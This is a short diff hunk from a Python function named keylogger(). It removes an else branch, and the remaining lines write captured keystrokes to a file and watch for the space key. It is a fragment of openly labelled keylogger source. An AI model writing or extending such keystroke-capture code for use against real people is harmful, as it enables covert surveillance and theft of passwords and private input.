@@ -39,8 +39,6 @@ def keylogger():
             for i in allchars:
                 if char == i:
                     file.write(char)
-                else:
-                    char = ''
             
 
             if event.name == 'space':
